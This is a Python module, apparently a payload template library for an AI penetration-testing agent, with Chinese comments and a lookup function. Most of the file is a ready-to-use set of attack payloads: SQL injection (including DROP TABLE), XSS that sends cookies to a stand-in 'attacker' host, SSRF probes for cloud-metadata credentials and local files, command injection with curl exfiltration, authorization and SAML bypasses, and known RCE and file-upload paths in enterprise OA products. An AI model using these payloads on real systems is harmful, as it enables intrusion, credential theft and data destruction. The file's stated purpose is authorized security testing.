"""Payload 模板库（纯 Python 内置，借鉴 03/AI渗透测试Agent/Strix）。

Strix 的方法论强调：发现弱点后优先加载已有 skill/payload，而非凭空
让 LLM 猜测 payload。本工具把常见漏洞的 payload 模板做成字典库，给
Attacker / Verifier 直接查，避免 LLM 浪费 token 凭空生成。

vuln_type: sqli / xss / ssrf / cmd_injection / idor / business_logic /
          privilege_escalation / unauthorized_api / saml_sso /
          hardcoded_credential / enterprise_oa / enterprise_business
category (按漏洞细分):
  - sqli: union / boolean / time / error-based / stacked
  - xss : reflected / dom / stored
  - ssrf : cloud-metadata / internal-port / file
  - privilege_escalation: horizontal / vertical
  - enterprise_oa: 泛微 e-cology / 致远 OA / 用友 NC/U8 / 通达 OA / 蓝凌 OA
  - enterprise_business: order_chain / approval_chain / payment_chain
不传参则列出全部类型。
"""
import json


# ===== Payload 字典库 =====
# 每个条目: {"payload": str, "note": str, "risk": "low/medium/high"}
_PAYLOADS: dict[str, dict[str, list[dict]]] = {
    "sqli": {
        "union": [
            {"payload": "' UNION SELECT NULL,NULL,NULL-- -",
             "note": "判断列数（NULL 兼容各类型）", "risk": "medium"},
            {"payload": "' UNION SELECT 1,version(),3-- -",
             "note": "报数据库版本（MySQL）", "risk": "high"},
            {"payload": "' UNION SELECT 1,user(),3-- -",
             "note": "报当前用户（MySQL）", "risk": "high"},
            {"payload": "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables-- -",
             "note": "爆表名（MySQL）", "risk": "high"},
        ],
        "boolean": [
            {"payload": "' AND 1=1-- -",
             "note": "布尔真值（页面应正常）", "risk": "low"},
            {"payload": "' AND 1=2-- -",
             "note": "布尔假值（页面应异常，确认注入点）", "risk": "low"},
            {"payload": "' AND SUBSTRING((SELECT user()),1,1)='r'-- -",
             "note": "逐字符盲注", "risk": "high"},
        ],
        "time": [
            {"payload": "' AND SLEEP(5)-- -",
             "note": "MySQL 时间盲注（响应延 5s）", "risk": "medium"},
            {"payload": "'; WAITFOR DELAY '0:0:5'-- -",
             "note": "MSSQL 时间盲注", "risk": "medium"},
            {"payload": "' AND pg_sleep(5)-- -",
             "note": "PostgreSQL 时间盲注", "risk": "medium"},
        ],
        "error-based": [
            {"payload": "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
             "note": "MySQL extractvalue 报错注入", "risk": "high"},
            {"payload": "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
             "note": "MySQL updatexml 报错注入", "risk": "high"},
        ],
        "stacked": [
            {"payload": "; INSERT INTO users VALUES('attacker','pw')-- -",
             "note": "堆叠执行插数据（MSSQL/PG 支持，MySQL 默认禁）", "risk": "high"},
            {"payload": "; DROP TABLE users-- -",
             "note": "堆叠删表（仅验证注入能力，慎用）", "risk": "high"},
        ],
    },
    "xss": {
        "reflected": [
            {"payload": "<script>alert(1)</script>",
             "note": "经典 reflected XSS 探测", "risk": "low"},
            {"payload": "<img src=x onerror=alert(1)>",
             "note": "img onerror 绕过 script 过滤", "risk": "medium"},
            {"payload": "\"><svg onload=alert(1)>",
             "note": "闭合属性 + svg onload", "risk": "medium"},
            {"payload": "javascript:alert(1)",
             "note": "javascript: 伪协议（href 场景）", "risk": "medium"},
        ],
        "dom": [
            {"payload": "#<img src=x onerror=alert(1)>",
             "note": "DOM XSS hash 注入（location.hash 输出到 innerHTML）", "risk": "medium"},
            {"payload": "?name=<img src=x onerror=alert(document.cookie)>",
             "note": "DOM XSS query 参数", "risk": "high"},
        ],
        "stored": [
            {"payload": "<script>fetch('//attacker/?c='+document.cookie)</script>",
             "note": "存储型 XSS 偷 cookie（需外带接收端）", "risk": "high"},
            {"payload": "<svg onload=fetch('//attacker/?c='+document.cookie)>",
             "note": "存储型 svg onload 偷 cookie", "risk": "high"},
        ],
    },
    "ssrf": {
        "cloud-metadata": [
            {"payload": "http://169.254.169.254/latest/meta-data/",
             "note": "AWS EC2 元数据（含 IAM 凭证路径 /iam/security-credentials/）", "risk": "high"},
            {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
             "note": "Azure 实例元数据", "risk": "high"},
            {"payload": "http://metadata.google.internal/computeMetadata/v1/",
             "note": "GCP 元数据（需 Metadata-Flavor: Google 头）", "risk": "high"},
        ],
        "internal-port": [
            {"payload": "http://127.0.0.1:6379/",
             "note": "探测内网 Redis（开放则 6379 可被 SSRF）", "risk": "medium"},
            {"payload": "http://127.0.0.1:9200/_cluster/health",
             "note": "探测内网 Elasticsearch", "risk": "medium"},
            {"payload": "http://127.0.0.1:8080/",
             "note": "探测内网 8080 服务", "risk": "low"},
            {"payload": "gopher://127.0.0.1:6379/_INFO",
             "note": "gopher 协议打内网 Redis（深度 SSRF）", "risk": "high"},
        ],
        "file": [
            {"payload": "file:///etc/passwd",
             "note": "本地文件读取（Linux）", "risk": "high"},
            {"payload": "file:///c:/windows/win.ini",
             "note": "本地文件读取（Windows）", "risk": "high"},
            {"payload": "dict://127.0.0.1:11211/stat",
             "note": "dict 协议打内网 memcached", "risk": "high"},
        ],
    },
    "cmd_injection": [
        {"payload": "; id",
         "note": "Linux 命令拼接执行 id", "risk": "medium"},
        {"payload": "| whoami",
         "note": "管道执行 whoami", "risk": "medium"},
        {"payload": "`id`",
         "note": "反引号执行 id", "risk": "medium"},
        {"payload": "$(whoami)",
         "note": "$() 替换执行", "risk": "medium"},
        {"payload": "& net user",
         "note": "Windows & 执行 net user", "risk": "high"},
        {"payload": "; curl http://attacker/?d=$(whoami)",
         "note": "命令执行 + 外带（需接收端）", "risk": "high"},
    ],
    "idor": [
        {"payload": "user_id=1001  (改前一位)",
         "note": "改 user_id 探越权读他人资料", "risk": "high"},
        {"payload": "order_id=ORD20240101001  (改尾号)",
         "note": "改 order_id 探越权查他人订单", "risk": "high"},
        {"payload": "Authorization: Bearer <他人 token>",
         "note": "替换 token 探鉴权失效", "risk": "high"},
    ],
    "business_logic": [
        {"payload": "price=-100  或 amount=-1",
         "note": "负价格 / 负数量（订单系统）", "risk": "high"},
        {"payload": "step=pay&skip=verify  (跳过校验步骤)",
         "note": "跳步骤绕过流程校验", "risk": "high"},
        {"payload": "coupon=NEW100&reuse=true  (重复使用优惠)",
         "note": "优惠/折扣重复利用", "risk": "high"},
        {"payload": "target_user_id=<他人ID>  (越权换 ID)",
         "note": "修改 target_user_id 越权操作", "risk": "high"},
        {"payload": "count=99999999  (整型溢出/超大)",
         "note": "超大数量触发整数溢出或异常分支", "risk": "medium"},
        {"payload": "role=user -> role=admin  (状态校验位篡改)",
         "note": "直接改 role 提权", "risk": "high"},
    ],

    # ===== 企业高频漏洞模板（用户要求重点侧企业漏洞）=====
    # 权限越权（水平 + 垂直）
    "privilege_escalation": {
        "horizontal": [
            {"payload": "user_id=1001 -> user_id=1002 (Cookie/Token 不变)",
             "note": "水平越权：改 ID 看他人数据，鉴权 token 保持不变", "risk": "high"},
            {"payload": "stu_id=2024001 -> stu_id=2024002",
             "note": "教育场景：改学号查他人成绩", "risk": "high"},
            {"payload": "order_id=A1001 -> order_id=A1002",
             "note": "改订单号查/操作他人订单", "risk": "high"},
        ],
        "vertical": [
            {"payload": "普通用户 token 直接调用 /admin/* 接口",
             "note": "垂直越权：普通 token 调后台接口", "risk": "high"},
            {"payload": "role=user 参数改为 role=admin",
             "note": "请求体直接改 role 提权", "risk": "high"},
            {"payload": "去掉前端跳转，直接 POST /admin/user/create",
             "note": "绕过前端鉴权跳转，直调后台接口", "risk": "high"},
        ],
    },

    # 未授权 API 访问
    "unauthorized_api": [
        {"payload": "无 Cookie/Token 直接 GET /api/user/profile",
         "note": "未授权访问：去掉鉴权头看是否返回数据", "risk": "high"},
        {"payload": "无 Token GET /api/admin/users",
         "note": "未授权访问后台用户列表接口", "risk": "high"},
        {"payload": "无 Token GET /actuator/env (Spring Boot)",
         "note": "Spring Boot Actuator 未授权信息泄露", "risk": "high"},
        {"payload": "无 Token GET /swagger-ui.html / /v2/api-docs",
         "note": "Swagger API 文档未授权暴露", "risk": "medium"},
        {"payload": "无 Token GET /graphql  (introspection)",
         "note": "GraphQL 内省查询未授权", "risk": "medium"},
        {"payload": "无 Token GET /api/internal/* (内部接口)",
         "note": "内部接口外网可达", "risk": "high"},
    ],

    # SAML/SSO 单点登录漏洞
    "saml_sso": [
        {"payload": "SAML Response 删除 Signature 节点",
         "note": "XML 签名包装（XSW）：删签名看是否仍接受", "risk": "high"},
        {"payload": "SAML NameID 改为 admin@domain",
         "note": "改 NameID 冒充管理员身份", "risk": "high"},
        {"payload": "SAML Audience 改为其他 SP",
         "note": "跨服务提供者越权（Audience 校验缺失）", "risk": "high"},
        {"payload": "SAML Response 重放（同 token 多次提交）",
         "note": "重放攻击（缺时间窗校验）", "risk": "medium"},
        {"payload": "XFF: X-Forwarded-For: 127.0.0.1 + SAML",
         "note": "伪造内网 IP 绕过 SSO 鉴权", "risk": "medium"},
    ],

    # 硬编码凭证检测（教育 + 企业高频）
    "hardcoded_credential": [
        {"payload": "JS 内 grep: (password|passwd|secret|key)\\s*[:=]",
         "note": "前端 JS 硬编码密钥（用 crypto_tool.analyze_crypto_js）", "risk": "medium"},
        {"payload": "API 文档 grep: Authorization: Basic / Bearer",
         "note": "Swagger 文档硬编码 Token", "risk": "high"},
        {"payload": ".env / config 文件 grep: (DB_|SECRET_|API_KEY)",
         "note": "配置文件硬编码（白盒场景，code_audit_summary 配合）", "risk": "high"},
        {"payload": "源码 grep: AKIA[A-Z0-9]{16}",
         "note": "硬编码 AWS Access Key", "risk": "high"},
        {"payload": "源码 grep: jdbc:[a-z]+://.*password=",
         "note": "JDBC 连接串硬编码密码", "risk": "high"},
    ],

    # 企业 OA/ERP 高频漏洞模板（用友/泛微/致远/通达）
    "enterprise_oa": {
        "泛微 e-cology": [
            {"payload": "GET /weaver/bsh.servlet.BshServlet",
             "note": "泛微 bsh.servlet 远程代码执行", "risk": "critical"},
            {"payload": "GET /cloudstore/ecode/install.do",
             "note": "泛微 install.do 任意文件上传", "risk": "high"},
            {"payload": "GET /weaver/lnkr.dll?cmd=delete",
             "note": "泛微 lnkr.dll 任意文件操作", "risk": "high"},
            {"payload": "POST /api/ec/dev/auth/applyOther",
             "note": "泛微 E-Office 任意用户添加", "risk": "high"},
        ],
        "致远 OA": [
            {"payload": "GET /seeyon/htmlofficeservlet",
             "note": "致远 A8 htmlofficeservlet 任意文件", "risk": "critical"},
            {"payload": "GET /seeyon/status.jsp",
             "note": "致远 status.jsp 信息泄露", "risk": "medium"},
            {"payload": "POST /seeyon/ajaxAction.do?method=ajaxAction",
             "note": "致远 ajaxAction 任意文件上传", "risk": "high"},
            {"payload": "GET /seeyon/getSessionList.jsp",
             "note": "致远 getSessionList 会话泄露", "risk": "high"},
        ],
        "用友 NC/U8": [
            {"payload": "GET /service/~ai/bsh.servlet.BshServlet",
             "note": "用友 NC bsh.servlet RCE", "risk": "critical"},
            {"payload": "GET /uclientconfig.jsp",
             "note": "用友 U8 UClientConfig 信息泄露", "risk": "medium"},
            {"payload": "POST /servlet/~bc/obtainservlet",
             "note": "用友 NC obtainservlet 任意文件", "risk": "high"},
        ],
        "通达 OA": [
            {"payload": "GET /inc/data@oa.php",
             "note": "通达 data@oa 未授权访问", "risk": "high"},
            {"payload": "GET /general/report/design/report",
             "note": "通达 report 任意文件包含", "risk": "high"},
            {"payload": "GET /ispirit/interface/gateway.php",
             "note": "通达 gateway 任意文件上传", "risk": "critical"},
        ],
        "蓝凌 OA": [
            {"payload": "POST /sys/ui/extend/varkind.jsp",
             "note": "蓝凌 varkind 任意文件上传", "risk": "high"},
            {"payload": "GET /sys/search/sys_search_main.jsp",
             "note": "蓝凌 sys_search SQL 注入", "risk": "high"},
        ],
    },

    # 企业业务逻辑高频（订单/支付/审批链路）
    "enterprise_business": {
        "order_chain": [
            {"payload": "加购→跳过支付→直接访问 /api/order/confirm",
             "note": "跳步：跳过支付直接确认订单（chain_attacker）", "risk": "high"},
            {"payload": "下单 price=100 -> 改成 price=-1 提交",
             "note": "负价格：订单价格改负值测后端校验", "risk": "high"},
            {"payload": "下单 quantity=99999999",
             "note": "超大数量触发整数溢出或异常分支", "risk": "medium"},
        ],
        "approval_chain": [
            {"payload": "申请→跳过审核→直接调 /api/approval/pass",
             "note": "跳步：跳过审核直接通过", "risk": "high"},
            {"payload": "已驳回申请→直接调 /api/approval/pass",
             "note": "状态回退：已驳回改已通过", "risk": "high"},
            {"payload": "审批 status=0 -> status=1",
             "note": "状态校验位篡改：待审改已审", "risk": "high"},
        ],
        "payment_chain": [
            {"payload": "支付金额 amount=0.01 (原价 999)",
             "note": "支付金额篡改：改成极小值", "risk": "high"},
            {"payload": "支付回调重复提交（同 order_id 多次）",
             "note": "重放支付回调：测重复支付校验", "risk": "high"},
            {"payload": "退款金额 > 原支付金额",
             "note": "退款越界：退超原支付", "risk": "high"},
        ],
    },
}


def payload_library(vuln_type: str = "", category: str = "") -> str:
    """按漏洞类型 + 子类查 payload 模板。

    vuln_type 取值: sqli / xss / ssrf / cmd_injection / idor / business_logic
    category 取值（按 vuln_type 细分，可选）:
      sqli: union / boolean / time / error-based / stacked
      xss : reflected / dom / stored
      ssrf : cloud-metadata / internal-port / file
    不传参列出全部类型 + 子类索引。
    """
    vt = (vuln_type or "").lower().strip()
    cat = (category or "").lower().strip()

    # 无参：列索引
    if not vt:
        lines = ["== payload_library 索引 =="]
        for vtype, subs in _PAYLOADS.items():
            sub_list = ", ".join(subs.keys()) if isinstance(subs, dict) else "-"
            # 统计 payload 总数
            total = sum(len(v) for v in subs.values()) if isinstance(subs, dict) else len(subs)
            lines.append(f"  {vtype:16} ({total:3} 条)  子类: {sub_list}")
        lines.append("\n调用: payload_library(vuln_type='sqli', category='union')")
        return "\n".join(lines)

    # 找 vuln_type
    if vt not in _PAYLOADS:
        valid = ", ".join(_PAYLOADS.keys())
        return f"未知 vuln_type='{vt}'。支持: {valid}"

    block = _PAYLOADS[vt]

    # 嵌套字典（sqli/xss/ssrf 有子类）
    if isinstance(block, dict) and block and isinstance(
            next(iter(block.values())), list):
        if cat:
            if cat not in block:
                valid_cat = ", ".join(block.keys())
                return f"未知 category='{cat}' for {vt}。支持: {valid_cat}"
            target = {cat: block[cat]}
        else:
            target = block
    else:
        # 单层列表（cmd_injection/idor/business_logic）
        target = {"_": block} if isinstance(block, list) else block

    lines = [f"== payload_library vuln_type={vt}"
             + (f" category={cat}" if cat else "") + " =="]
    for sub_name, items in target.items():
        if sub_name != "_":
            lines.append(f"-- {sub_name} ({len(items)} 条) --")
        for it in items:
            mark = " <==" if it["risk"] == "high" else ""
            lines.append(f"  [{it['risk']:6}] {it['payload']}")
            lines.append(f"          note: {it['note']}{mark}")
    lines.append("\n注意: payload 仅用于授权测试。high 风险 payload 谨慎使用，"
                 "可能造成数据写入/删除/越权。")
    return "\n".join(lines)


def list_types() -> str:
    """列出全部支持的漏洞类型（供 Agent 调用前了解可用范围）。"""
    return json.dumps({
        "vuln_types": list(_PAYLOADS.keys()),
        "categories": {k: (list(v.keys()) if isinstance(v, dict)
                           and v and isinstance(next(iter(v.values())), list)
                            else None)
                       for k, v in _PAYLOADS.items()},
    }, ensure_ascii=False, indent=2)
